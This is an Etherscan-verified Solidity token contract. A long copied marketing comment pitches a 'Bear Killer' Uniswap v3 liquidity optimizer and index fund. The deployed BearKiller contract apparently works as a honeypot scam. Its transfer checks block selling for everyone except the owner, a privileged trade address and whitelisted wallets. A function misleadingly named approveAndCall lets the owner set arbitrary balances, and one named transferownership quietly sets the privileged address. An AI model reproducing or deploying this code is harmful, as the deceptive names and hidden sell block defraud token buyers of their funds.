/**
 *Submitted for verification at Etherscan.io on 2021-07-25
*/

/*
Bear Killer Protocol: Redefining Liquidity Optimization

We recently launched BearKiller Killer v1 with a record time of releasing the dapp in just a month, what started merely as a thought while reading Uniswap v3 blog back in April is now turning into something truly powerful.
Read more about the inception of BearKiller Killer here.
We initially started with the idea of providing users with a dapp that they can use to put their liquidity in the most optimized range.

While we were building this, we realized this feature, while extremely helpful, is not enough.
Even if you provide liquidity in the most optimized range
You still need to constantly monitor it to avoid getting out of range and losing fees.
If it’s still in range but not optimized you risk losing a lot of fees.
The differences between small optimizations can be huge.
Let’s take an example.
Imagine you are choosing whether to concentrate liquidity to the
DAI/USDT pair in the 0.99–1.01 price range, or the 0.9–1.1 range.
The former range is 10 times more efficient, meaning that if the price spends more than even 20% of its time in that range, that’s a better place to allocate.
For every optimization to the range or getting the price in range, the user needs to send a transaction, which yes, you guessed it right means spending more ether on gas fees which honestly no one wants to.
Imagine a platform where on one click you can add liquidity with
No more manual oversight.
No more worrying about constant optimization.
No more spending loads of gas fees for each optimization.
This is what Bear Killer Protocol is all about.
The Rebranding Of BearKiller Killer
With these exciting features, we felt that there is a need to rebrand for positioning ourselves as the first universal automated liquidity optimizer protocol.
The Logo

The logo represents our Bear Killer protocol which will allow liquidity providers to always have their liquidity in the most optimal position.
The upward direction shows that their capital will increase in the same upward trajectory over time.
The Website
The Uniplot website will be launched on June 1.
Here is a sneak peek at what it would look like.

The BEAR KILLER Token
The BEAR KILLER token is a governance/utility token that will be initially distributed to early adopters and can be bought through public/private sale.
The BEAR KILLER token is designed in a way that allows the token to be backed by hundreds of tokens. (More on this later)
It will attain further utility with the Bear Killer protocol as new features are implemented.
More info on token sale will be announced in the coming weeks.


A new standard for AMMs
The evolution of the protocol
Since its inception in 2018 by Uniswap, automated market makers (AMMs) have played a pivotal role in the emergence of decentralized finance. They have established new revenue streams for numerous users and offered them the security and convenience of trading through their own crypto wallets. To date they have amassed over $200B in trading volume and have rivaled some of the largest centralized exchanges in the industry. Uniswap V3, represents an evolution of this concept, as it introduces new features to improve the efficiency of the platform and ultimately increase the earning potential of the users who participate on it.
Greater control and precision
The centerpiece feature of V3 is how it affords liquidity providers with more precise control over how they allocate their capital. For the first time, liquidity can be allocated to specific price ranges of the market maker’s choosing. This feature which has been coined as “Concentrated Liquidity” has a two-fold benefit, one; increased market depth for tokens in pools and second, a reduction in slippage for traders. Furthermore, by concentrating the liquidity into a smaller range it will increase its capital efficiency when it is being used to sustain trades. Resulting in more fees being generated for an LP with a smaller liquidity position, than compared to V2.
To gain a better understanding of the benefits of Concentrated Liquidity, it is helpful to compare it to the structure of the previous Uniswap V2 liquidity provisioning. In V2, liquidity was distributed along an X * Y = K price curve, where buying and selling into the pool shifts the LPs position on the X * Y = K curve. The even distribution along the entire curve allows for trading across the whole price range from zero to infinity. The major drawback was that it resulted in a lot of unused liquidity if most of the trading only occurred in a narrow price range.


Liquidity Concentration
Rather than distributing liquidity along the entire curve, V3 segments the curve into straight lines with a limited length. These smaller straight lines represent the price ranges chosen by the LPs and where all the V3 liquidity will sit. A long line yields better trading price coverage, and a short line yields better fees generated per amount of liquidity provided. By segmenting the curve, it results in the full utilization of the liquidity as the price moves along the straight line, giving LP’s far greater capital efficiency and very low unused liquidity.
AMM style limit orders
While AMMs have seen an explosion in growth in recent times, the lack of Limit Orders have been a sticking point for many traders. A limit order is an order that will only execute at a predetermined price, it allows traders to buy at a lower or sell at a higher price than the current market price. This key feature has distinguished the centralized exchanges that use order books from the decentralize exchanges that are AMMs. Now, V3 has introduced a feature it coins as “Range Orders” to level the playing field between the two mediums of exchange.
Range Orders are not a one-to-one representation of Limit Orders, but they reach parity in certain areas. Traders who want to sell their tokens for another at a specific price point can provide their single asset as liquidity in a targeted price range above or below the market price. Once the market price shifts, and it enters the targeted range, the deposited tokens will be swapped for other tokens in the pool smoothly along the price curve.
Traders can now wait for the shifting market to trigger their desired tokens swaps similarly to the traditional Limit Orders, but with the added benefit of also earning fees as the trading price fluctuates within their targeted range. However, due to the unpredictable nature of the markets, the swapped asset must be removed before the price reverts back to above or below the targeted range. Else, it will be swapped back into the original deposited asset.
More sophisticated strategies
Having the ability to target specific price ranges opens the possibility for LPs to employ different strategies to maximize the earning potential of their liquidity positions. For one, LPs may choose to target a single wide price range for a moderate gain in capital efficiency to lower their risk to price fluctuations. Secondly, LPs might choose to target a single narrow price range for a large gain in capital efficiency while they increase their exposure to risk. Or finally, LPs may decide to target multiple price ranges within the same pool to increase their coverage to multiple price points while spreading out the risk.
Another area where V3 takes a step forward pertains to the fees that LPs accumulate. There are now multiple fee tiers to choose from, rather than the fixed 0.3% that was established in Uniswap V1. These flexible fees will result in more appropriate compensation to LPs in accordance to the risk of their liquidity position. To give a real word example, if a user were to provide liquidity to a low volatility asset such as a stable coin, then they might opt for the low fee tier to encourage more trading of the token. Whereas, with a high volatility asset such as a newly launched token, the user may opt for the high fee tier to offset the risk of holding the token.
The additional features of V3 will ultimately breed more competition and gamification, which is a good thing for users on the platform. Market makers will be encouraged to compete to offer the best rates in order to profit. Traders will be given the opportunity to distinguish themselves from the rest by using their skill and know-how of the
markets. All in all, it will result in greater trading volume on the platform and a shot in the arm for the whole decentralized finance sector.
With great power comes great responsibility
For proficient users, their earning potential on V3 will be much higher than that of V2. On the flip side, the margin of error for those who are not as skilled will in fact be smaller on the new protocol. For instance, with “Concentrated Liquidity” there is a real possibility of far more exposure to “Impermanent Loss”. Which is when a user provides liquidity to a pool and the market price of the asset diverges from the initial price at the time of deposit. At this point, arbitrageurs become incentivized to rebalance the pool and effectively take profit from the LPs. Concentrated liquidity increases the likelihood that the market price will move away from it and increase the composition of the LPs holdings into the weaker asset.
There is also a similar story with the “Range Orders”. As it offers no guarantee that once the market price of an asset reaches the trader’s target price range it will be swapped over for the other asset. Therefore, the responsibility is still on the trader to judge the correct time to remove their asset, to successfully perform this quasi-Limit Order. This does not diminish Range Orders as a feature, but it highlights how the users who keep up to date with the markets will be able to utilize it to its full potential.
Opening the gates for new platforms
As much progress as Uniswap V3 has made over V2, it is still not the finished article. On the one hand, it adds new tools to the arsenal of traders to help maximize profits and lower their risk. While on the other hand, it adds an extra layer of complexity to tasks that were straightforward on V2.This extra complexity reduces the margin of error and potentially can lead to unfavorable situations for some users. The good news is that often in this industry, the launch of one protocol or platform can pave the way for new projects/services to be built on top to improve the user experience. This very well may be the case with V3, as it could spawn services that can help clients to optimize their strategies while managing the complexity on their behalf.


What exactly is BearKiller Killer?
Note: This excerpt represents the first part of the article series: ‘Explaining the Bear Killer Protocol”. As we progress through this series, we will explain more about the Bear Killer protocol from its technicalities, additional features, and existing framework to the broader vision that it aims to achieve.
The next article in particular will discuss the technical aspect of the protocol along with some of its game-changing features.
Let’s Start from the beginning
The radical innovation in the blockchain industry continues to propel as Uniswap- one of the top decentralized exchanges operating in the DeFi space launches version 3.0 of its protocol. Uniswap v3 allows liquidity providers to concentrate their capital in custom price ranges.
This not only ensures effective utilization of the liquidity invested but also offers greater control to liquidity providers in allocating their capital.

In addition to that, the amount of capital at risk is far less as compared to Uniswap v2 since the price ranges are narrow and there is a better chance of getting a greater proportion of the overall liquidity utilized in terms of retail trades.
Prior to the launch of Uniswap v3, liquidity providers had to spread their liquidity over the entire price curve from zero to infinity which not only resulted in lesser percentage returns but also required higher capital.

The inception of Uniswap v3 has provided a whole new avenue of yield farming to liquidity providers. Through the concentrated liquidity mechanism, liquidity providers can earn significantly higher amounts of returns on their investments while having full control over the deployment of their funds.
The idea
There is no denying the fact that the concept of ‘Concentrated Liquidity’ promises more enticing returns to liquidity providers than the previous version of the protocol.
However, ‘there is no such thing as free lunch’, to achieve these attractive returns liquidity providers have to constantly oversee and manage their capital.

They have to readjust their positions by adding or removing liquidity every time the active price falls out of the concentrated liquidity range. The readjustment not only requires constant manual oversight but it also involves high transaction costs and with regular price fluctuations in the market, liquidity providers will still have to lock large amounts of capital to keep earning fees.
The only way liquidity providers on Uniswap v3 can achieve these attractive returns is when someone else manages their capital for them and this is where our protocol comes into play.
Here comes BearKiller Killer
BearKiller Killer saves liquidity providers from the hassle of manual oversight through automated liquidity optimization and management.
The aim of the Bear Killer protocol is to ensure maximum capital efficiency by allocating the right mix of capital to each of Uniswap’s liquidity pools existing on its platform.
The challenge with concentrated liquidity is keeping it in the active price range so that it consistently earns fees through trades. The more time the capital is locked in the active price range the more trading fees it earns.
If price fluctuates and capital goes out of the price range it does not earn any fees. BearKiller Killer solves this problem by allocating capital to the narrowest price range to earn the maximum amount of fees. Even minor optimizations in price ranges can impose drastic changes in terms of capital efficiency.
Apart from offering optimized liquidity positions, the Bear Killer protocol also auto-rebalances liquidity in appropriate price ranges to cater to the changing market prices.
In addition to that, the transaction cost involved with readjusting liquidity is also disbursed by the protocol so liquidity providers don't have to worry about the increasing gas costs on Ethereum.
Universal Liquidity Optimization
Uniswap v3 has introduced a breakthrough design improvement in the form of ‘Concentrated liquidity’ in the automated market-making (AMM) ecosystem. With the traction that liquidity farming has gained within a month, we can assume other decentralized exchanges following the same model in the near future.
For this purpose, we introduce the concept of universal liquidity optimization which indicates that the protocol will be compatible with all other AMM’s that may adopt the concentration liquidity mechanisms in future.
TLDR
BearKiller Killer serves as an investment manager for all the liquidity providers who want to invest their capital in Uniswap v3 while avoiding manual oversight and other added complexities of the protocol.
With BearKiller Killer, these liquidity providers can deposit their assets, choose the desired pair of tokens they want to provide liquidity for and the protocol will deploy their capital accordingly. Once the capital is deployed, the protocol continuously optimizes liquidity positions and automatically rebalances them as per the market movements and risk appetite of the liquidity provider.

The Bear Killer Index Fund

Note: This excerpt is the third article of the series “Explaining the Bear Killer Protocol”. Read the previous article “A Nosedive into Bear Killer Protocol”.
In the last article, we revealed that the protocol’s earnings get sent to an Index Fund, which maintains the value of the native token.
We can now explore its inner mechanism to understand how this Index Fund encapsulates the goal of BearKiller Killer and why it is a crucial feature.
Furthermore, we will also expand on how the holders of the $BEAR KILLER tokens can make their voices heard and influence key aspects of the protocol.
Finally, we will cover the possible strategies of malicious users would be and how the protocol will deal with them.
Index Fund
What is the index fund, and how does it work?
The index fund will serve as a repository for the fees earned by the BearKiller Killer protocol, its primary purpose will be to underpin the value of the $BEAR KILLER token.
It will be a separate smart contract that is connected to the protocol to accumulate tokens. The more fees the protocol generates, the more the Index Fund will accumulate tokens and grow in value. Users will then be able to interact with it directly to access the tokens held within it.
Here are how the two stages of the Index Fund will work:
Accumulating tokens (protocol à Index Fund):
Tokens are accumulated into the Index Fund from the protocol when LPs withdraw their earnings(fees), these can be in two forms:
1. Vault fares:
When an LP wants to withdraw the fees generated while staying in the Bear Killer protocol, they’ll have two options.
a) When an LP chooses to withdraw their LP fee tokens, there will be a 2% fare on the fees generated (current rate, which can be changed through governance) of their fee tokens will be sent to the Index Fund.

b) When an LP chooses to receive BEAR KILLER tokens equivalent in dollar value to their LP fee tokens instead, there will be no fare on the LP and all their LP fee tokens will be sent to the Index Fund.
2. Burning BEAR KILLER tokens (Index Fund à User):
The only way for users to access the tokens held in the Index Fund is by burning their BEAR KILLER tokens.
A percentage of the BEAR KILLER token supply can be burned to access the same percentage of tokens in the index fund supply.
Example
The index fund holds $10m worth of various tokens accumulated from “Vault fares” and “LP fees”.
These tokens are: $1m LINK, $3m UNI, $6m USDC.
“John” would like to access these tokens in exchange for his BEAR KILLER tokens, of which he holds 0.1% of the supply.
If John interacts with the index fund and burns all his tokens, he will be eligible to receive 0.1% of the supply of the index fund ($10,000 worth of various tokens).
He would receive: $1000 LINK, $3000 UNI, $6000 USDC
How will it affect the BEAR KILLER token price?
The 1:1 ratio of burning BEAR KILLER to receive Index Fund tokens will present opportunities for arbitraging between the index fund and exchanges, as the value and price diverge between the two.
If the value of BEAR KILLER tokens (value of total supply) decreases relative to the total value of the Index Fund, then holders will be incentivized to burn their BEAR KILLER at a 1:1 ratio to receive Index Fund tokens with a higher dollar value. Moreover, the token’s value will not be able to fall below that of the underlying assets in the Index fund.
As long as there is a delta between the two values, the burning will continue until the BEAR KILLER token value matches that of the Index Fund. Furthermore, this ensures that a rising Index Fund will also lift the BEAR KILLER token’s value by the same mechanism. Essentially, this will allow the Index Fund to become a collateralized backstop for the BEAR KILLER token, as its price will become pegged to it.
Example
Initially, the total value of the Index Fund and the market cap of BEAR KILLER are equal at $20M
The Index Fund accumulates tokens and grows in value to $15M in a short period of time
“Sarah” wants to take advantage of this delta and profit from it, she holds 0.1% of the supply of BEAR KILLER worth $10,000
If she interacts with the Index Fund and burns all her tokens, she will receive 0.1% of the Index Fund tokens worth $15,000
In theory, as more people take advantage of this difference, the continuous burning of the BEAR KILLER supply and the reduction in the Index Fund supply will cause both values to reach parity.
Consequently, raising the value of BEAR KILLER from its initial position.
What is the reasoning for an Index fund?
The index fund is another feature that separates BearKiller Killer from other liquidity optimizers. It aligns the incentives of the protocol with its users, as the value of its native token will be dependent on the success of the protocol.
The more people that use BearKiller Killer to provide liquidity, the more the index fund will accumulate tokens and grow in value. This, in turn, will reinforce the price of $BEAR KILLER token as the token burning will bolster its value proposition.
Positive feedback loop
Consequently, the Index fund can be thought of as the final piece in a positive feedback loop. The success of the protocol through high usage and fee generation will be captured and used to directly impact and increase the value of the native token.
Subsequently, a valuable BEAR KILLER token will facilitate better rewards for the “Captains” and more LPs choosing to receive the native token as their earnings, this, in turn, will drive up the usage of the protocol.
Let’s talk about Governance
What can be voted on and how much say will voters have?
Holding the BEAR KILLER token also grants users the opportunity to take part in the “Decentralized Governance” of BearKiller Killer. With their tokens they can vote on key aspects, such as changing the “Vault Fare”, changing the reward percentages for “Captains” or even making tweaks to how the protocol readjusts liquidity ranges.
There is no minimum amount required for voting, even holding one BEAR KILLER token will be sufficient.
BEAR KILLER holders will also be able to vote on the future direction of the protocol, e.g. choosing between two development paths to go down or the implementation of one feature over another. In addition to this, there will also be a foundation fund making up around 35% of the supply and its resources will be at the full discretion of the voters.
All these measures ensure that the BearKiller Killer protocol will ultimately be indebted to the holders of the token and not any other third parties.
Safeguarding the protocol
Possible attack vectors
In order to be sustainable, the protocol is set up in a way where only those who put something in can get something back in return. The universal and permissionless nature of BearKiller Killer means that anyone can deploy a Vault, contribute to its maintenance, and be rewarded for their efforts without needing to be whitelisted. However, this does open up the possibility for a minority who are looking for loopholes in the system to get back more than they put in.
This can be observed in malicious users who can try to drain the “Concentration Incentives” in the following way:
1. Deploy a Vault for a token pair with a very low amount of liquidity
2. Cause a drastic price change in that liquidity pool, with a single trade on Uniswap
3. When the price fluctuates greatly (by 30–40%), initiate a readjustment transaction on BearKiller Killer
4. Profit from the BEAR KILLER rewards for bringing the liquidity back into the optimal range
Possible attack prevention
The prevention is simple, we will always make sure that the premium is always less than the gas fees of a swap.
If a malicious user attempts to manipulate the price of an asset by sending it out of range through a swap transaction and then calls a readjustment function to alter the price range, he would have to pay more in terms of gas fees than the amount of premium he earns for playing a similar role to that of a captain.
Although the protocol offers anyone the ability to provide liquidity and deploy a vault to earn trading fees, it only enables the $BEAR KILLER token fee withdrawal option to whitelisted pairs to prevent worthless projects from entering the system.
The team will whitelist top token pairs at launch and in the future, $BEAR KILLER token holders can vote to whitelist any additional token pairs.
What we have learned so far
The Index Fund amplifies the success of the BearKiller Killer protocol as it captures the value created from people using the protocol and returns it to the token that powers the ecosystem. The protocol employs a governance model that ensures that its token holders will be at the front and center of future developments and will also have power over changing the current decisions.
The BearKiller Killer protocol also takes security very seriously and has contingency plans in place for possible attack vectors and penalties for “bad actors” that benefit the protocol.
In the following article, we will look into an exciting new feature that is only possible with V3 and coined by the BearKiller Killer team as “Flash Liquidity” and how it unlocks new avenues for generating income.
Stay tuned for more.
*/
pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract BearKiller {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}